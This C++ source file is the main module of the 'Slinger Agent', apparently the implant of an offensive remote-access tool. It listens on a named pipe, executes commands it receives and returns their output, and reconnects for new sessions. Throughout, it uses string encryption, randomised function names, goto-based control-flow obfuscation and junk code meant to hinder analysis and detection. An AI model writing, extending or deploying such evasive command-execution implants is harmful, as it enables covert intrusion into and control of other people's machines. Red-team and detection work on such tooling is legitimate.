#include "obfuscation.h"
#include "pipe_core.h"
#include "command_executor.h"
#include <string>
#include <vector>
#include <ctime>
#include <fstream>
#include <sstream>

// Cross-platform compatibility
#ifdef _WIN32
    #include <windows.h>
#else
    #include <unistd.h>
    #include <sys/time.h>
    #include <thread>
    #include <chrono>
#endif

namespace obf = obfuscated;

// Debug logging functionality (conditionally compiled)
#ifdef DEBUG_MODE
class DebugLogger {
private:
    std::ofstream log_file;
    bool enabled;

    std::string get_timestamp() {
        #ifdef _WIN32
            SYSTEMTIME st;
            GetLocalTime(&st);
            char buffer[64];
            sprintf(buffer, "%04d-%02d-%02d %02d:%02d:%02d.%03d",
                    st.wYear, st.wMonth, st.wDay,
                    st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
            return std::string(buffer);
        #else
            auto now = std::chrono::system_clock::now();
            auto now_time_t = std::chrono::system_clock::to_time_t(now);
            auto now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                now.time_since_epoch()) % 1000;
            char buffer[64];
            std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", std::localtime(&now_time_t));
            char full_buffer[80];
            sprintf(full_buffer, "%s.%03ld", buffer, now_ms.count());
            return std::string(full_buffer);
        #endif
    }

public:
    DebugLogger() : enabled(false) {
        // Create debug log file in the same directory as the executable
        #ifdef _WIN32
            char exe_path[MAX_PATH];
            GetModuleFileNameA(NULL, exe_path, MAX_PATH);
            std::string exe_dir(exe_path);
            size_t pos = exe_dir.find_last_of("\\/");
            if (pos != std::string::npos) {
                exe_dir = exe_dir.substr(0, pos);
            }
            std::string log_path = exe_dir + "\\slinger_agent_debug.log";
        #else
            std::string log_path = "./slinger_agent_debug.log";
        #endif

        log_file.open(log_path, std::ios::out | std::ios::app);
        if (log_file.is_open()) {
            enabled = true;
            log("=== Slinger Agent Debug Log ===");
            log("Log file: " + log_path);
            log("Agent started");
        }
    }

    ~DebugLogger() {
        if (enabled) {
            log("Agent shutting down");
            log("=== End of Log ===");
            log_file.close();
        }
    }

    void log(const std::string& message) {
        if (enabled && log_file.is_open()) {
            log_file << "[" << get_timestamp() << "] " << message << std::endl;
            log_file.flush();
        }
    }

    void log(const std::string& category, const std::string& message) {
        if (enabled && log_file.is_open()) {
            log_file << "[" << get_timestamp() << "][" << category << "] " << message << std::endl;
            log_file.flush();
        }
    }
};

// Global debug logger instance
static DebugLogger g_debug_log;

#define DEBUG_LOG(msg) g_debug_log.log(msg)
#define DEBUG_LOG_CAT(cat, msg) g_debug_log.log(cat, msg)
#else
#define DEBUG_LOG(msg)
#define DEBUG_LOG_CAT(cat, msg)
#endif

// Obfuscated function names using compile-time randomization
#define MAIN_FUNC OBF_FUNC_NAME(main_entry_point)
#define PIPE_HANDLER OBF_FUNC_NAME(handle_pipe_communication)
#define CMD_PROCESSOR OBF_FUNC_NAME(process_command_request)
#define CLEANUP_FUNC OBF_FUNC_NAME(cleanup_resources)

// Obfuscated strings
constexpr auto PIPE_NAME = OBF_STRING("\\\\.\\pipe\\slinger_agent_");
constexpr auto SUCCESS_MSG = OBF_STRING("OK");
constexpr auto ERROR_MSG = OBF_STRING("ERROR");
constexpr auto AGENT_EXIT_CMD = OBF_STRING("exit");

class SlingerAgent {
private:
    PipeCore pipe_handler;
    CommandExecutor cmd_executor;
    std::string pipe_name;
    bool running;

    // Generate pipe name using build-time configuration
    std::string OBF_FUNC_NAME(generate_pipe_name)() {
        DEBUG_LOG_CAT("INIT", "Generating pipe name");
        // Use custom pipe name if defined at build time, otherwise use time-based random
        #ifdef CUSTOM_PIPE_NAME
            // Return the exact custom pipe name without any modifications
            std::string name = std::string(CUSTOM_PIPE_NAME);
            DEBUG_LOG_CAT("INIT", "Using custom pipe name: " + name);
            return name;
        #else
            auto base_name = PIPE_NAME.decrypt();
            DEBUG_LOG_CAT("INIT", "Using time-based pipe name generation");

            // Cross-platform time-based suffix generation
            #ifdef _WIN32
                SYSTEMTIME st;
                GetSystemTime(&st);
                auto suffix = std::to_string(st.wMilliseconds + st.wSecond * 1000);
            #else
                struct timeval tv;
                gettimeofday(&tv, nullptr);
                auto suffix = std::to_string(tv.tv_usec + tv.tv_sec * 1000);
            #endif

            std::string full_name = base_name + suffix;
            DEBUG_LOG_CAT("INIT", "Generated pipe name: " + full_name);
            return full_name;
        #endif
    }

    // Main command processing loop
    bool OBF_FUNC_NAME(process_commands)() {
        DEBUG_LOG_CAT("EXEC", "Entering command processing loop");
        int empty_read_count = 0;
        const int max_empty_reads = 300; // 300 * 100ms = 30 seconds timeout

        while (running) {
            auto request = pipe_handler.read_command();
            if (request.empty()) {
                empty_read_count++;
                DEBUG_LOG_CAT("EXEC", "Empty read, count: " + std::to_string(empty_read_count));

                // If too many empty reads, assume client disconnected
                if (empty_read_count >= max_empty_reads) {
                    DEBUG_LOG_CAT("EXEC", "Client timeout - no data received");
                    break; // Exit command loop and reconnect
                }
                continue;
            }

            // Reset counter on successful read
            empty_read_count = 0;

            DEBUG_LOG_CAT("EXEC", "Received command: " + request.substr(0, 50) + (request.length() > 50 ? "..." : ""));

            // Check for exit command
            if (request == AGENT_EXIT_CMD.decrypt()) {
                DEBUG_LOG_CAT("EXEC", "Exit command received, shutting down");
                running = false;
                pipe_handler.send_response(SUCCESS_MSG.decrypt());
                break;
            }

            // Execute command and send response
            DEBUG_LOG_CAT("EXEC", "Executing command");
            auto result = cmd_executor.execute(request);
            DEBUG_LOG_CAT("EXEC", "Command executed, response length: " + std::to_string(result.length()));
            pipe_handler.send_response(result);
            DEBUG_LOG_CAT("EXEC", "Response sent");
        }
        DEBUG_LOG_CAT("EXEC", "Exiting command processing loop");
        return true;
    }

public:
    SlingerAgent() : running(false) {
        DEBUG_LOG_CAT("INIT", "Initializing SlingerAgent");
        pipe_name = OBF_FUNC_NAME(generate_pipe_name)();
        DEBUG_LOG_CAT("INIT", "Agent initialized with pipe: " + pipe_name);
    }

    // Main agent entry point
    int OBF_FUNC_NAME(run)() {
        DEBUG_LOG_CAT("MAIN", "Agent run() started");
        DEBUG_LOG_CAT("MAIN", "Pipe name: " + pipe_name);

        // Initialize pipe communication
        DEBUG_LOG_CAT("PIPE", "Initializing pipe communication");
        if (!pipe_handler.initialize(pipe_name)) {
            DEBUG_LOG_CAT("ERROR", "Failed to initialize pipe");
            return 1;
        }
        DEBUG_LOG_CAT("PIPE", "Pipe initialized successfully");

        running = true;

        // Main connection loop - agent stays alive and accepts multiple connections
        DEBUG_LOG_CAT("MAIN", "Entering main connection loop");
        while (running) {
            // Wait for client connection with retry logic
            DEBUG_LOG_CAT("PIPE", "Waiting for client connection");
            bool connected = false;
            int retry_count = 0;
            const int max_retries = 3;

            while (!connected && retry_count < max_retries) {
                DEBUG_LOG_CAT("PIPE", "Connection attempt " + std::to_string(retry_count + 1) + "/" + std::to_string(max_retries));
                connected = pipe_handler.wait_for_connection();
                if (!connected) {
                    retry_count++;
                    DEBUG_LOG_CAT("PIPE", "Connection failed, retry count: " + std::to_string(retry_count));
                    if (retry_count < max_retries) {
                        // Brief delay before retry
                        DEBUG_LOG_CAT("PIPE", "Waiting 1 second before retry");
                        #ifdef _WIN32
                            Sleep(1000); // 1 second
                        #else
                            sleep(1);
                        #endif
                    }
                }
            }

            if (!connected) {
                DEBUG_LOG_CAT("ERROR", "Failed to establish connection after " + std::to_string(max_retries) + " attempts");
                // Don't exit - loop back and try again
                DEBUG_LOG_CAT("MAIN", "Waiting 5 seconds before next connection attempt");
                #ifdef _WIN32
                    Sleep(5000);
                #else
                    sleep(5);
                #endif
                continue;
            }

            DEBUG_LOG_CAT("PIPE", "Client connected successfully");

            // Handshake already sent by wait_for_connection() in pipe_core.h line 199
            // Don't send a second handshake here

            // Process commands
            DEBUG_LOG_CAT("MAIN", "Starting command processing");
            OBF_FUNC_NAME(process_commands)();

            // Disconnect client and loop back for next connection
            DEBUG_LOG_CAT("MAIN", "Client session ended, disconnecting");
            pipe_handler.disconnect_client();
            DEBUG_LOG_CAT("MAIN", "Client disconnected, ready for next connection");
        }

        // Cleanup
        DEBUG_LOG_CAT("MAIN", "Performing cleanup");
        OBF_FUNC_NAME(cleanup)();
        DEBUG_LOG_CAT("MAIN", "Agent run() completed successfully");
        return 0;
    }

    void OBF_FUNC_NAME(cleanup)() {
        DEBUG_LOG_CAT("CLEANUP", "Cleaning up agent resources");
        running = false;
        pipe_handler.cleanup();
        DEBUG_LOG_CAT("CLEANUP", "Cleanup completed");
    }
};

// Obfuscated main function with control flow obfuscation
int OBF_FUNC_NAME(MAIN_FUNC)() {
    DEBUG_LOG("=== AGENT ENTRY POINT ===");
    DEBUG_LOG_CAT("MAIN", "Main function entered");

    // Control flow obfuscation using goto and random jumps
    volatile int flow_control = obf::random_seed() % 3;
    DEBUG_LOG_CAT("MAIN", "Control flow value: " + std::to_string(flow_control));

    switch (flow_control) {
        case 0: goto init_agent;
        case 1: goto setup_flow;
        default: goto direct_run;
    }

init_agent:
    {
        SlingerAgent agent;
        if (obf::random_seed() % 2) goto run_agent;
        return agent.OBF_FUNC_NAME(run)();
    }

setup_flow:
    {
        if (obf::random_seed() % 3 == 1) goto init_agent;
        SlingerAgent agent;
        goto run_agent_flow;
    }

direct_run:
    {
        SlingerAgent agent;
        goto run_agent;
    }

run_agent:
    {
        SlingerAgent agent;
        return agent.OBF_FUNC_NAME(run)();
    }

run_agent_flow:
    {
        SlingerAgent agent;
        auto result = agent.OBF_FUNC_NAME(run)();
        goto cleanup_and_exit;
    }

cleanup_and_exit:
    return 0;
}

// Entry point with additional obfuscation
int main() {
    DEBUG_LOG("=== BINARY STARTED ===");
    DEBUG_LOG_CAT("ENTRY", "main() called");

    // Add junk code for obfuscation
    volatile int junk1 = obf::random_seed();
    volatile int junk2 = junk1 * 0x1337;

    DEBUG_LOG_CAT("ENTRY", "Calling obfuscated main function");
    int result;
    if (junk2 % 2 == 0) {
        result = OBF_FUNC_NAME(MAIN_FUNC)();
    } else {
        result = OBF_FUNC_NAME(MAIN_FUNC)();
    }

    DEBUG_LOG_CAT("ENTRY", "Agent exiting with code: " + std::to_string(result));
    return result;
}

#ifdef _WIN32
// Windows entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    DEBUG_LOG_CAT("ENTRY", "WinMain() called (Windows entry point)");
    return main();
}
#endif
